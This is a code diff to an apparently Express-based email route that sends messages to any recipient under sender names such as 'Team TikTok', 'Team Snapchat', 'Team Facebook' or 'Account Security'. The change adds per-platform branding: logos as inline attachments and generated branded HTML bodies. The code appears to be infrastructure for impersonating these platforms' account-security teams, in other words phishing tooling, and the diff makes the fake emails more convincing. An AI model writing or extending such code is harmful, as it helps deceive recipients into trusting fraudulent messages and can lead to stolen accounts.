@@ -5,7 +5,10 @@ import {
   checkPlatformSmtpStatus, 
   classifySmtpError, 
   convertMarkdownToHtml, 
-  checkEmailRateLimit 
+  checkEmailRateLimit,
+  getPlatformBrandInfo,
+  resolveLogoAsset,
+  generateBrandedEmailHtml
 } from '../services/emailService';
 
 const router = Router();
@@ -125,18 +128,9 @@ router.post('/send', async (req: Request, res: Response) => {
     }
 
     const tid = (templateId || '').toLowerCase();
-    let displayName = 'Account Security';
-    let platformKey = 'tiktok';
-    if (tid.includes('tiktok') || tid === 'tpl-002') {
-      displayName = 'Team TikTok';
-      platformKey = 'tiktok';
-    } else if (tid.includes('snapchat') || tid === 'tpl-003') {
-      displayName = 'Team Snapchat';
-      platformKey = 'snapchat';
-    } else if (tid.includes('facebook') || tid === 'tpl-001') {
-      displayName = 'Team Facebook';
-      platformKey = 'snapchat'; // Fallback
-    }
+    const brand = getPlatformBrandInfo(tid);
+    const displayName = brand.displayName;
+    const platformKey = tid.includes('tiktok') ? 'tiktok' : 'snapchat';
 
     const { host: h, port: p, user: u, pass: pw, configured: c, useSSL, resendApiKey, fromEmail } = buildTransporter(platformKey);
     
@@ -145,7 +139,16 @@ router.post('/send', async (req: Request, res: Response) => {
       return;
     }
 
+    const logoAsset = resolveLogoAsset(brand.logoFilename, brand.cid);
+
     if (resendApiKey) {
+      const emailHtml = generateBrandedEmailHtml({
+        platform: tid,
+        subject,
+        message,
+        logoSrc: logoAsset.fallbackUrl,
+      });
+
       const resendResponse = await fetch('https://api.resend.com/emails', {
         method: 'POST',
         headers: {
@@ -157,7 +160,7 @@ router.post('/send', async (req: Request, res: Response) => {
           to: [recipient],
           subject,
           text: message,
-          html: convertMarkdownToHtml(message)
+          html: emailHtml,
         })
       });
 
@@ -186,12 +189,32 @@ router.post('/send', async (req: Request, res: Response) => {
       greetingTimeout: 10000,    // 10s to receive SMTP greeting
       socketTimeout: 15000,      // 15s of socket inactivity before abort
     });
+
+    const attachments = logoAsset.filePath
+      ? [
+          {
+            filename: logoAsset.filename,
+            path: logoAsset.filePath,
+            cid: logoAsset.cid,
+          },
+        ]
+      : [];
+
+    const logoSrc = logoAsset.filePath ? `cid:${logoAsset.cid}` : logoAsset.fallbackUrl;
+    const emailHtml = generateBrandedEmailHtml({
+      platform: tid,
+      subject,
+      message,
+      logoSrc,
+    });
+
     const info = await transporter.sendMail({
       from: `"${displayName}" <${u}>`,
       to: recipient,
       subject,
       text: message,
-      html: convertMarkdownToHtml(message),
+      html: emailHtml,
+      attachments,
     });
 
     console.info('[EmailService] Email sent:', {
